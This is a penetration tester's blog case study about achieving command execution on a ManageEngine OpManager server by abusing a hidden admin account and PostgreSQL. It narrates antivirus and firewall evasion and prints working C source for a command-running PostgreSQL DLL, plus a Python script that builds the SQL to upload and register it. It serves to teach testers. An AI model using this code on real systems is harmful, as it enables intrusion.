---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-15_emotional-rollercoaster-a-unique-case-study-of-bypassing-antivirus-and-firewall-.md
original_filename: 2023-03-15_emotional-rollercoaster-a-unique-case-study-of-bypassing-antivirus-and-firewall-.md
title: 'Emotional Rollercoaster: A Unique Case Study of Bypassing Antivirus and Firewall
  by Abusing PostgreSQL'
category: documents
detected_topics:
- command-injection
- ssrf
- file-upload
- path-traversal
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- ssrf
- file-upload
- path-traversal
- automation-abuse
- api-security
language: en
raw_sha256: 4114a56ce8c075289d76b9dbd7baf2bbbd6720096cfb0f36c5d9f3ea3a710512
text_sha256: 7703ea403751ed5f7dd252032e81b738194c1878ad2601f65f2a8dadd275ae71
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# Emotional Rollercoaster: A Unique Case Study of Bypassing Antivirus and Firewall by Abusing PostgreSQL

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-15_emotional-rollercoaster-a-unique-case-study-of-bypassing-antivirus-and-firewall-.md
- Source Type: markdown
- Detected Topics: command-injection, ssrf, file-upload, path-traversal, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `4114a56ce8c075289d76b9dbd7baf2bbbd6720096cfb0f36c5d9f3ea3a710512`
- Text SHA256: `7703ea403751ed5f7dd252032e81b738194c1878ad2601f65f2a8dadd275ae71`


## Content

---
title: "Emotional Rollercoaster: A Unique Case Study of Bypassing Antivirus and Firewall by Abusing PostgreSQL"
url: "https://medium.com/@yousefamery/emotional-rollercoaster-a-unique-case-study-of-bypassing-antivirus-and-firewall-by-abusing-2b36d8f6553c"
authors: ["Yousef Amery (@YousefAmery)"]
bugs: ["RCE", "Old components with known vulnerabilities"]
publication_date: "2023-03-15"
added_date: "2023-03-15"
source: "pentester.land/writeups.json"
original_index: 1371
scraped_via: "browseros"
---

# Emotional Rollercoaster: A Unique Case Study of Bypassing Antivirus and Firewall by Abusing PostgreSQL

Emotional Rollercoaster: A Unique Case Study of Bypassing Antivirus and Firewall by Abusing PostgreSQL
Yousef Amery
27 min read
·
Mar 15, 2023

--

Introduction:

During one of my PT engagements, I have encountered a very interesting case where I had to bypass antivirus and firewall restrictions, create a custom {C} code to be compiled as a DLL, and abuse PostgreSQL functionalities to achieve code execution on the server.

The abuse of PostgreSQL functionalities is not a new technique. However, I have noticed a lack of resources on the internet regarding unique cases where a reverse shell is not an option and you have no access to the server that would prove your code execution. These two cases are the only available ones that I could find online, so I've decided to create a new case study that would help the community and share a story of trying harder to achieve proof of code execution on a server.

As part of this walkthrough, I will be providing the {C} source code as well as some instructions for you to compile the DLLs to be compatible with PostgreSQL 9.2 and 9.3 (32bit-64bit).

The journey of exploiting this vulnerability can only be described as an emotional rollercoaster, where every time I thought I’ve achieved RCE a new challenge rises. So sit back and relax, have a cup of coffee, and let me tell you a story of perseverance in the world of penetration testing.

Note: I’m going to discuss the failed attempts first before the successful one, if you’re here for the C code of the DLLs or looking for the fastest answer skip to (Section 9: Let’s End This (Creating DLL)).
You can also check my GitHub for the needed scripts.

Wheeee!
Section 1: The Vulnerability

The problem is a combination of 2 vulnerabilities in the ManageEngine OpManager Application version 11.6.0 :

Press enter or click to view image in full size
ManageEngine OpManager Application version 11.6.0

The vulnerabilities are:

CVE-2015–7765 : A default hidden account “IntegrationUser” with a default password of “plugin” exists on the application. The account has administrator privileges.

CVE-2015–7766 : An administrator can bypass SQL query restrictions via a comment in the query (/**/) instead of a space, as the following command: “INSERT/**/INTO.”

This can be described best from the ManageEngine website below:

Press enter or click to view image in full size
ManageEngine description of the vulnerabilities

So, in summary, any administrator account can run SQL queries, and there is a hidden administrator account with default credentials on all the installations of the application.

I love old vulnerabilities, where everything was cute and simple. a hidden admin account? Hmmm… might as well call it backdoor! 😁

Section 2: Checking the Target System

In my target environment, one of the servers had this application installed on it, and can be accessed from my attacking machine, as we are both in an internal network (“sort of”).

Alright, this is good news, let's go check if the hidden user actually exists on this server, and test its credentials:

Press enter or click to view image in full size
Successfully logged in to OpManager

Awesome, we successfully logged in to OpManager.

looking around in the application, it seemed like a new installation. Nothing is integrated with it, there are only default users existing on it, and the application doesn’t display/have any network data as it is supposed to be.

My first guess was an administrator downloaded the application, didn’t use it, and everyone forgot about it. As this application is from 2015 and we are now in 2023.

Nevertheless, acquiring sensitive network data (finding) would look cute in a report😊, but we’re not here for that.😉

However, I was able to find a page with important information below:

Press enter or click to view image in full size
Sensitive server information

This exposes 3 Sensitive information:

1 - Operating System: Windows server and its version.

2 - Database Type: PostgreSQL with this installation.

3 - Windows and Application Architecture: 64-bit.

Note: This information is going to be crucial in later sections of this walkthrough.

At the time, this seemed like good information to be presented in our report, but again, my eyes 👀 were looking up for the execution of SQL queries.

Alright, now let's check this Database query functionality, and I ran the select version query on it:

Press enter or click to view image in full size
Database query version shown 9.2

This is just perfect, as in my knowledge this opens many avenues to be tested, and a lot of ways to be abused.

We can also check if we are running under the context of DBA as below:

Press enter or click to view image in full size
We are running with admin privileges
Section 3: The Public Exploit

At this point we confirmed almost everything:

1- hidden admin user, and it has default credentials ✔

2 - The ability to run SQL queries ✔

3 - Can bypass SQL query restrictions via a comment in the query (/**/) instead of a space? (maybe🙄, but more on this later)

This is great and all, but let's dig more about these CVEs online, and see what others have about them.

Continue reading the reference section of the NIST CVE-2015–7765, we find it mentioning exploits for the vulnerability, and the last entry caught my eye (exploit-db.com).

Press enter or click to view image in full size
Reference for public exploits from NIST

Opening this link (exploit-db.com/exploits/38221), we get the below:

Press enter or click to view image in full size
Metasploit module ready for this vulnerability

Ho Ho Hooooooo………… This day just keeps getting better and better (little did we know)

A public exploit, made as a Metasploit module, what else do we need? 😁

We could just run this and potentially have a reverse shell on the server!!

But first, let's read the code of the exploit, get familiar with what it does, and get an idea if there are any danger or side effects to running this.

Reading the info, we get the below:

Press enter or click to view image in full size
Module Info

So, as we expected, it uses the SQL query functionality available for the admin account to upload a WAR file and deploy it on the server, which ultimately will execute whatever is in that WAR file.

By just reading this, you get the idea that this file needs to be removed when we’re done.

So, how does this exploit upload a WAR file? It's not hard, and actually a known method.

It uses Large Objects, which is a useful structure that enables the storage of complex data types in the database. For example, can be used to store images, PDF documents, or even binary files.

And it can be exported back to the file system as an exact copy of the original imported file.

So, as the below code from the exploit, the first query is (SELECT lo_unlink(-1)):

Press enter or click to view image in full size

Every large object has a number, so giving it (-1) will start from the last possible number, which is usually not used and safer.

Then, we create a new large object:

Press enter or click to view image in full size

Then Metasploit creates a base64 encoded war payload and uploads it using the below command:

Press enter or click to view image in full size

Notice how it uses the (/**/) bypass we discussed earlier, with the (INSERT) command.

Then it exports the WAR file to a known directory (……/tomcat/webapps/):

Press enter or click to view image in full size

And Metasploit will actually request us to delete this file manually, and give us its name and path:

Lastly, Metasploit will send multiple requests to this newly created file to trigger a deployment for it and reach the JSP file inside it, which would execute our code.

Press enter or click to view image in full size

If you want more details about the uploading method, there is an excellent blog called (hacktricks) by (@CarlosPolop), where he touches on many Penetration Testing Tricks including the file upload method here.

I highly recommend checking his stuff as I regularly use it in Penetration Testing engagements, and it will be referenced multiple times during this Walkthrough.

Section 4: Exploitation

This is basically the whole exploitation method, and if you still have some questions or want more details check the mentioned blog, otherwise I’m going to assume you got the gist of it.

I don’t like to run exploits willy-nilly, but we already had consent from the owners to exploit such vulnerabilities, which is great news.🙂
In their point of view, they wanted to prove and justify such projects to the management, which is ok in my book.😄

Cool and simple exploit. Now let's prepare Metasploit to lunch it:

Press enter or click to view image in full size
Metasploit Options

I set the RHOST, and RPORT then checked to see if the target is vulnerable.

Apparently, the module just checks the version of the application displayed on the login page, and matches it with the vulnerable version.

Nevertheless, everything is in place then let's run it:

But first, I want you to start a counter for every time I try to exploit this vulnerability.

Alright buddy, this is attempt #1, let's go:

Press enter or click to view image in full size
Exploit Failed

Ok, something went wrong. Let's debug this by redirecting the exploit through Burp Suite:

Press enter or click to view image in full size
Redirecting the exploit through burp

I know there is a better way to redirect the traffic through a proxy, but I like this way.

Anyway, let's run the exploit and inspect the sent requests:

Press enter or click to view image in full size
Running the exploit through burp

Hmmm, more stuff this time, but we’re interested in the requests sent to the server:

Press enter or click to view image in full size
The sent Requests by Metasploit

Alright, this needs to be unpacked:

#1 - Is the sent queries to create a large object and upload the WAR file.

#2 - Is the sent requests to deploy the WAR file, and reach the (.jsp) file inside it.

#3 - Is a Manual request that I sent using the browser to the created (ZothUjdl.jsp) file, and got a redirect to the login page.

So? What is going on here?

The creation of the large object was successful ✔
The upload of the (.war) file to the database was successful ✔
The exporting of the (.war) file to the file system was successful ✔
The requests to reach the (.jsp) file had a problem ✖

When trying to reach the newly created file we got a (500 Internal Server Error):

Press enter or click to view image in full size
Code 500 response for (.jsp) file

And a long server response:

Press enter or click to view image in full size
The error body

And this is not all. When trying to reach this file again, we got a (404) and a redirect, indicating that the file is no longer there.

Press enter or click to view image in full size
Error 404 (file not found) for the second request

The error says: “The server encountered an internal error that prevented it from fulfilling this request.”

Ok, two crucial pieces of information to note here:
1- The file was there, and now it isn't.
2- Something is preventing the server from completing our request.

This can only point to an antivirus. ☢
It stopped the execution of the (.jsp) file, then deleted/quarantined it, and the file is no longer there for any new requests.

At this point, I realized this is not going to be as easy as I thought, but we’re not too far.

War Mode Activated
Section 5: Antivirus Evasion (.JSP)

Ahh… An antivirus…

It is no surprise that our file (Reverse Shell) is being detected by an antivirus, after all, it’s created by Metasploit which is a well-known signature and behavior to the majority of antiviruses.
Hell… it could just be Windows Defender for all I know.😑

For example, let's upload the created (.war) file to VirusTotal, and see how many engines are detecting it:

Press enter or click to view image in full size
VirusTotal against Metasploit (.war) Reverse Shell

Basically, everyone is detecting it, including Microsoft.

I didn’t want to go blind here and start making a (.jsp) file that evades everything. I needed to have some idea of what the Antivirus present on this server could be.

Fortunately for me, there were other servers in this target environment and my Nessus scan was already done.
Checking my Nessus scan and specifically, the (nslookup) information reveals a server named : (Bitdefender.something.something).

Press enter or click to view image in full size
A server named Bitdefender.X.X

This is great because this environment could be using Bitdefender endpoint and this is the server that controls it. which means I could focus and target on BitDefender Evasion.

To my knowledge, BitDefender is not exactly bulletproof and you usually have a bit of a wiggle room compared to Kaspersky for example.

If you would like to know more about antiviruses, I highly recommend the (The PC Security Channel) on Youtube. They have great comparisons for antiviruses running hundreds of malware and comparing the detection rate between these antiviruses.

Add to that, we are creating a (.jsp) inside a (.war) file, which is generally less detected compared to an (.asp) file for example.

This gave me hope that it might not be a hard task, and that I might actually just find a ready (.jsp) reverse shell that is not detected by BitDefender.

And I was correct. An old web shell that came into my mind is this:
https://github.com/jbarcia/Web-Shells/blob/master/laudanum/jsp/cmd.war

And a quick check on VirusTotal reveals the below:

Press enter or click to view image in full size

Detected by 25 engines but not BitDefender!! 😅

Well.. this is lucky😁, and the (.jsp) file inside it is also not detected by BitDefender:

Press enter or click to view image in full size

Alright, this is great news, let’s upload it and see.

Attempt #2:
I did the upload this time manually, and you have to mind something called (page number) which is explained in the mentioned earlier (Hacktricks) blog.

Press enter or click to view image in full size
Press enter or click to view image in full size

Uploading the file, then browsing to it reveals good news and bad news:

-The good news is: the file is there and it is not being deleted by the antivirus, which further confirms our hypothesis regarding the antivirus being (Bitdefender).

-The bad news is:

Press enter or click to view image in full size
Server error code 500

And when we refresh, the file stays there but a new error is displayed:

Server error code 500

This could be due to many reasons, but most importantly the application being old and left unmaintained.

Checking to see if we can fix/avoid this error seemed that you need access to the server to be able to fix this. Which we surely don’t have.

I've then decided to use another Shell, just to confirm if there is a problem with the last one. And an old shell that came into my mind is one that is used by IPPSEC in multiple videos:

Example from IPPSEC : (HackTheBox — Jerry)
The (.jsp) Shell : SecurityRiskAdvisors

Checking this shell on VirusTotal:

Press enter or click to view image in full size
Shell not detected by BitDefender

Very good, it's not detected by the majority of engines.
Let's upload it and check if it will work.

Attempt #3:

I uploaded the file using the same functionality mentioned earlier but the same errors were displayed again:

Press enter or click to view image in full size
Server error code 500

Attempt #4:
I just wanted to be sure there is nothing wrong with these shells, so I've decided to use another one:

The (.jsp) Shell: LaiKash/JSP-Reverse-and-Web-Shell

And the same errors were displayed.

Oh come on dude…
Section 6: Another Web Server (ASP.NET) Angle

At this point, I gave up on the (.jsp) avenue as it seems there is something wrong with the server regarding the Java Compiler.

Alright, so if we can’t run (.jsp) files on the server, there might be another web server running on another port. And I was correct.
Nessus scan showed another port that has an IIS server running on it:

Press enter or click to view image in full size
Another HTTP server on port 80

Not to be confused, the ManageEngine application was running on (80XX), and the new discoverd web server is on port (80)

This is great news because it introduces a new avenue for attack.
We could theoretically upload a Webshell on this webserver and try to execute it.

Also, this is an (IIS) server, meaning it is most probably running an (ASP.NET) application [based on what I've seen in this environment]

So, we need to upload a (.asp/.aspx) Webshell on the server and try to execute it.

However, this is (.Net) we are talking about. In my experience, it's not an easy task to obfuscate it and most antiviruses can detect obfuscated Webshells.
Even Microsoft themselves have implemented numerous techniques in (IIS) to prevent attacks including Webshells.

This might seem like a shot in the dark, but we have to try it anyway.
Remember we are only looking for a proof of concept, and a fully functional Webshell is not exactly necessary in this case.

Let's take the below Webshell as an example:

On kali: (/usr/share/davtest/backdoors/aspx_cmd.aspx)

When Uploaded to VirusTotal we get detection of 31 engines as below:

Press enter or click to view image in full size
Detection of 31 engines

Working on this Webshell to bypass Bitdefender we get the below results on each step:

Press enter or click to view image in full size
Detection of 19 engines

Then:

Press enter or click to view image in full size
Detection of 15 engines

Then:

Press enter or click to view image in full size
Detection of 11 engines

As you can see, I was able to successfully bypass 20 antivirus engines, but not BitDefender. It's grabbing onto this Webshell like a predator to its prey.

It was not letting go of it, and it didn’t seem to bypass it while having any resemblance of a Proof of concept that could be usable in a report.😔

Unfortunately, I have also tried multiple other Webshells and was able to successfully bypass various antivirus engines, but BitDefnder decided to shine like a star and detect all of them.
It was clear at this point that weaponizing a specific Webshell for BitDefender is going to take more time than I have.

If you want more details about Antivirus Evasion, there is an excellent page by the same blog mentioned earlier (hacktricks) including the Antivirus Evasion Methodology here.

Thinking outside the box 📦, I just need an execution of any command on the server, it doesn’t exactly have to be an OS command, and could just be ASP.NET commands.
This pops an idea that we could run a (.aspx) test script that would check the ASP.NET version and display it in the browser.

I have used the below test script:

<%@ Page Language="VB" %>

<script runat="server">
  Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)
  lblVersion.Text = "Your server is running ASP.NET and the version is " & System.Environment.Version.ToString()
  End Sub
</script>

<html>
<head>
  <title>ASP.NET Version</title>
</head>
<body>
  <form id="form1" runat="server">
  <asp:Label ID="lblVersion" runat="server"></asp:Label>
  </form>
</body>
</html>

And got the below result in my testing environment:

Script execution

And guess what?
All antiviruses don't care about this script:

Press enter or click to view image in full size
The Script is undetected by all engines

This is awesome 😄, we have finally reached something that can be executed on the server.

Attempt #5:
Now let's upload it to the server and browse to it, then we get the below result:

Press enter or click to view image in full size
Error Code 404 File not found!!!

How is this possible?😠 The file is literally there.
We also can check if we have any mistake in the created path of the file by creating another (.txt) file there in the same directory and then browsing to it, we get the below:

Press enter or click to view image in full size

Did the antivirus detect it? Apparently not, because I’ve tested putting some garbage in a (.asp) file, and the same error was displayed.

First thing, I thought it could be the (.asp) extension, and changed it to (.aspx) which changed the server response to:

Press enter or click to view image in full size
Server error states it cannot display this error remotely

As stated in the server error, because we are connecting to the server remotely, we can’t see the error details.

However, after a few tests in my testing environment, I have reached the conclusion that the below error is the one that is being raised on the server:

Press enter or click to view image in full size
Server Error because ASP.NET is not installed

This Administrator Installed IIS and didn’t choose to install (ASP.NET) with it while having the ManageEngine application also installed on the server.
This means we can’t run (.asp/.aspx) files on this web server.

What an unlucky case. The Administrator did not care about the server. All he wanted is to test the ManageEngine application for a brief moment and forgot about it. And also apparently never used the installed IIS server.

It was clear at this point that this is a dead end, and I have made a mistake by wasting my time on it.
I wanted to share this to remind you not to do my mistake and go check the server configurations first before attempting to bypass the antivirus.
I’ve learned this the hard way, and maybe you will remember it in your next encounter.

Hello darkness my old friend…
Section 7: The PostgreSQL Angle

Uploading Webshells on this server has been a major problem, but we still have one way of trying to exploit this vulnerability.

So far we have been using PostgreSQL commands to upload files and run commands.
It has been the first thing that successfully worked in this vulnerability and hopefully will be the right way of solving it.

Using PostgreSQL, there is a known way of abusing its functionalities to be able to run your code on the server, and specifically, it involves PostgreSQL Extensions.

PostgreSQL is built with a focus on easy extensibility, allowing extensions loaded into the database to function seamlessly alongside built-in features. These extensions are written in C and should be compiled as DLL files📚, and are able to provide additional functions to the database.
However, starting from version 8.1 of PostgreSQL, extension libraries must be compiled with a special header, otherwise, the database will reject them.

For more information on this functionality on Linux and windows, check out this Page from (hacktricks). It also contains a ready and compiled DLL for PostgreSQL.

The general plan here is to create a PostgreSQL User Defined Function (UDF) from a DLL file, that executes our code on the server.
Fortunately for us, there are ready “and sometimes” precompiled DLLs provided by the community that can be used in this vulnerability.

The provided DLLs by the community cover 2 cases when integrated with the PostgreSQL database, and can run the below Code Execution on the server:

1- The first DLL can execute binary files on the system (example: calculator) and also take an argument to specify how many instances to spawn of that binary (example: open 3 calculators).

This case/DLL is not going to be useful in our case because we don’t have access on this server to verify the opened processes. So moving on to the second case.

2- The second DLL is a Reverse Shell 😀, when giving it an IP address and Port, it will connect back to your PC with a command shell.

The second DLL seems very promising, and will hopefully not be detected by the antivirus because DLLs are generally less analyzed and detected by antiviruses. (Check this page for more info)

Alright, so let's go over our plan here:

1- Compile the C code to a DLL on our testing environment.

2- Load the DLL remotely into the server using an easy method by using share files, which avoids touching the disk and hopefully avoids the Antivirus entirely.

3- Create a PostgreSQL User Defined Function (UDF) based on our DLL.

4- Run a query that executes our newly created UDF.

The C code for the DLL can be found in two versions:
1- On (hacktricks) here and from the original post here.
2- On GitHub here, and a blog explaining how to use it here.

We’re going to use the Code from GitHub for now, so let's start by compiling it in our testing environment.

You can check this blog post for more information about Compiling PostgreSQL extensions. And if you are new to Visual Studio and DLL compiling check out this post.

Press enter or click to view image in full size
C code Compiling in Visual Studio

We got the DLL for now, let's prepare an SMB share folder and host our DLL on it:

Press enter or click to view image in full size
Using impacket to host a shared folder

Attempt #6:
SMB server is ready, and DLL is ready, now let's create a User Defined Function (UDF) by instructing the database to fetch the DLL file from our shared folder, by executing the below query:

Press enter or click to view image in full size
Query to fetch the DLL from my shared folder

However, after a few seconds, we get the below error:

Press enter or click to view image in full size
Error: no such file or directory

Playing around with this, checking other SMB folders, and tcpdump/Wireshark connections, I have concluded that the Firewall blocks any initiated connections from this (Datacenter zone) to anything outside, despite our attacking machine being on the internal network.😣

There is a Firewall between anything else in the environment and these servers which have been hardened to block any initiated connections to the internet or even internally inside the environment. And I was able to confirm this info with the Network Engineers.😫

Why am I surprised? This is a highly sensitive environment with well-established configurations. It just happened to have a forgotten installed application that nobody noticed throughout the years.

Section 8: When Things Went Sideways

The previous attempt failed miserably because we can't establish any connections from the server to anything outside its Network.

However, this is a huge problem.
Even if we uploaded the reverse shell DLL to the server with the previously used method, we still won’t get a connection back because the firewall will block it.

This is where things went sideways.
Even if we have a remote code execution on the server, how can we prove it?
If the server is not allowed to the internet, doesn’t connect back to us, and won’t ping us, how can we prove the RCE? Can we even be considered to have an RCE on the server?😩

This is a unique and interesting situation that nobody has addressed it online, no matter how hard I searched.😢

As mentioned before, the provided DLLs online only addressed 2 cases which are spawning (calc.exe), and the other is a reverse shell.

How did we reach this point?😭 everything was so beautiful at the beginning💖 when we found a ready Metasploit module for this exploit.
Anyway, we’re too deep now, it's too late to back off🐱‍👤.

After a break and a good meal🍝, I have come up with a few ideas to tackle this, keep in mind any solution we introduce should bypass Firewall and Antivirus restrictions:

1- Crazy Solution: create a DLL that opens a Bind Shell, However, at this point, you proved to have a personal vendetta against this server.

2- Medium Risk Solution: Change something obvious on the server like opening a service that was closed (Ex: SSH, FTP…etc).

3- Medium Risk Solution: Replace one of the regularly running VBscripts of the ManageEngine with a script of our own that runs commands.

4- Low-Risk Solution: Create a DLL that runs passed OS commands to it, and host the output of these commands on the Webserver for us to view.

Remember, we need proof of code execution, so anything that falls into that category is acceptable but hopefully with the least impact on the server

Thinking about this, the Low-Risk Solution seemed the most fitting for this case, but this meant we’re gonna have to write some {C} code.

Roll up your sleeves!
Section 9: Let’s End This (Creating DLL)

Alright, the plan is simple, we create a DLL that executes passed OS commands to it, and we redirect the output of these commands to a text file on the Webserver, just like the one we created before:

However, this time instead of (“TestingThis”), we put the output of the (ipconfig) command for example, then browse to it to see the output.

Keep in mind, this DLL should not be detected by the Antivirus (BitDefender), because this time we have to upload it to the server.

The steps to follow:
1- Type the C code of the DLL.
2- Compile it as DLL successfully.
3- Check the DLL on VirusTotal to avoid Detection by BitDefender.
4- Upload the DLL on the server.
5- Create a Custom Function on the database.
6- Run the custom function with OS commands and the needed arguments.

Alright, After a while of checking around, I came up with the below-altered version of C code from the previously used reverse shell.
You can also find the below script on my GitHub repository: PostgreSQL-RCE-Extensions

/*

Usage:
This code (when compiled as a DLL) creates a PostgreSQL extension that registers a new function allowing an attacker to gain Remote Code execution on the server.
_________________

Use Cases:
Harsh egress filters blocking any initiated connection from the server to outside its zone.
Reverse Shell is not an option.

_________________

Features:
Can be loaded from a shared file over the network. (doesn't have to touch the disk)
If uploaded to disk, it's Antivirus friendly.

_________________

Usage Example:

1- Creaate the function on PostgreSQL:

From a shared file over the network:
CREATE FUNCTION Test(text) RETURNS void AS $$\\10.10.10.1\Shared-Folder\acmd.dll$$, $$connect_back$$ LANGUAGE C STRICT;

From a disk:
CREATE FUNCTION Test(text) RETURNS void AS $$C://inetpub//wwwroot//acmd.dll$$, $$connect_back$$ LANGUAGE C STRICT;

2. Execute the function with OS commands:
Example:
SELECT Test($$cmd /c whoami > C://inetpub//wwwroot//CommandOutput.txt$$);

*/

#include "postgres.h"
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

 /* convert text pointer to C string */
#define GET_STR(textp) \
  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

 CreateProcess(NULL, GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, FALSE, 0, NULL, NULL, &sui, &pi);
 PG_RETURN_VOID();
}

The function CreateProcess() had to be altered to set the handle inheritance to (FALSE), according to this example from Microsoft, and also can be seen here on StackOverflow.
The function was also altered to accept the process name as an argument, and you can also pass arguments with it as we will show soon.

For more information about this function, you can check Microsoft here.

I also didn’t want to change the (connect_back) name, just to avoid any problems in the next commands/queries.

After compiling this code as DLL, I tested it on my environment, and was able to run the below to create the custom function:

Press enter or click to view image in full size
Function created successfully

Then, after running the below query:

Press enter or click to view image in full size
Query to execute the (whoami) command and redirect its output to a file

We find the newly created file in (C:\Users\Public\):

Newly created file

And its content is the output of the (whoami) command:

The output of (whoami)

Awesome😃, it executes commands in the context of the database user.

Now let's check if our created DLL bypasses Antiviruses from VirusTotal:

Press enter or click to view image in full size
DLL undetected by antivirus

Very nice🤗, It’s not detected by anything.

Alright, now we can use the below python script to ease the process of creating the database queries.

This script is an altered version of the original publication by sourceincite.
You can also find this script on my GitHub repository: PostgreSQL-RCE-Extensions

#!/usr/bin/env python3

#You can use this script to automate the creation of the Database queries by supplying the OS command and the DLL.

import sys

if len(sys.argv) != 3:
  print("(+) usage %s <Command> <dll/so>" % sys.argv[0])
  print("(+) eg: %s OScommand si-x64-12.dll" % sys.argv[0])
  sys.exit(1)

Command = sys.argv[1]
lib = sys.argv[2]
with open(lib, "rb") as dll:
  d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
  start = i * 2048
  end  = (i+1) * 2048
  if i == 0:
  sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
  else:
  sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
  end  = (i+1) * 2048
  sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, $$C://inetpub//wwwroot//acmd.dll$$);"
sql += "CREATE FUNCTION Test(text) RETURNS void AS $$C://inetpub//wwwroot//acmd.dll$$, $$connect_back$$ LANGUAGE C STRICT;"
sql += "select Test('%s');" % (Command)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
  sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("  select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("  drop function Test(text);")

We can run the previous script as below:

Script execution

And it will create the below example queries:

Press enter or click to view image in full size
Created queries

There is a slight difference in the used queries to initiate the Large object, as you will see in the below commands, but both versions achieve the same result.

Now let's upload this DLL to the server as shown before by basically running the below skeleton queries:

Press enter or click to view image in full size

Attempt #7:

Now let's run the below query to create the custom function:

Press enter or click to view image in full size
Attempting to create a new function

But unfortunately, we got the below error:

Press enter or click to view image in full size
The server returns an error

Error: (org.postgresql.util.PSQLException: ERROR: could not load library “C://inetpub//wwwroot//acmd.dll”: %1 is not a valid Win32 application.)

I was willing to grab a crowbar and go full-auto Gordon Freeman on this server. I'm gonna change this project to physical security.

Alright, calm down, let’s see what is going on.

First thought… there is something wrong with the upload.
luckily, the DLL was exported to the Webserver at (c:/inetpub/wwwroot/), and we can download it from the server by just browsing to it:

(I have exported the DLL to the text file, just for testing as below)

Press enter or click to view image in full size
Downloading the DLL from the server

Checking both of the 2 files’ hashes, the one on my machine, and the one from the server, and they seem to match.

Alright, then after checking what this error is related to, it seemed that we are using a (32-bit) DLL, and the PostgreSQL on the server is (64-bit):

Press enter or click to view image in full size
The output of the select version() query

No problem, Let's compile our DLL to (64-bit) and try again.

However, we will need to download PostgreSQL (64-bit) on my testing environment for Visual Studio to be able to use it.

Downloading PostgreSQL (64-bit), then preparing Visual Studio to use it.

Preparing Visual Studio might be a little tricky, but you can check the below to help you:
Here, Here, Here, Here, and Here.

Attempt #8:

Alright, DLL is now compiled as (64-bit) and ready. Let's upload it to the server and run the below command:

Press enter or click to view image in full size
Attempting to create a new function

And we got the below error🥴:

Press enter or click to view image in full size
The server returns an error

The error states the DLL is 9.3, and the database is 9.2, which they don’t work together.

Press enter or click to view image in full size

How did this happen? Well, I'll tell you how…
Every post we have read so far said “The major version should match” and from my understanding, the major in this case is (9.x.x), but apparently it's not for some reason.
Also, downloading 9.3 was easier because it can be found on the official website while 9.2 was not.

Depending on the application, the major could also be the second number sometimes. This totally slipped my mind

Attempt #9:

Anyway, this is an easy fix.
Downloading PostgreSQL (64-bit) (9.2), then preparing Visual Studio to use the new version.

Then Compiling the DLL as (64-bit), uploading it to the server, and running the below query:

Press enter or click to view image in full size
Attempting to create a new function

No error was returned 😲.

wait… we’ve never reached this point before😮, calm down, and let's continue.

I ran the below query, that supposed to execute the (whoami) command and redirect the output of this command to a file on the webserver:

Press enter or click to view image in full size
Running the (whoami) command

Then browsing to this file we get:

Whoami command output

Ahhhhhhh……💨
Finally…

We have code execution on the server and it’s under the context of the system user. (Which is the highest privilege you can get on a machine 😄)

And we can also run the (ipconfig) command as below:

Press enter or click to view image in full size
Running the (ipconfig /all) command

And get the below result:

Press enter or click to view image in full size
Command (ipconfig /all) output
Weeehooo!
Outro:

This case has been quite a journey, filled with challenges and setbacks.

While I have attempted 8 failed attempts before a successful one, for each one of the 9 times I have genuinely believed this is the correct one.

I hope this case study has been helpful to the community and provided some insights into the world of Penetration Testing.
Remember, no matter how difficult the challenge may seem, with perseverance and the right approach, anything is possible.

I hope you’ve learned something new today, and I hope you’ve learned to adopt the “Trying Harder” mindset, where giving up is not an option.

— — — — — — — — -

That's it for this case study, see you next time fellow Pentesters.
Goodbye….
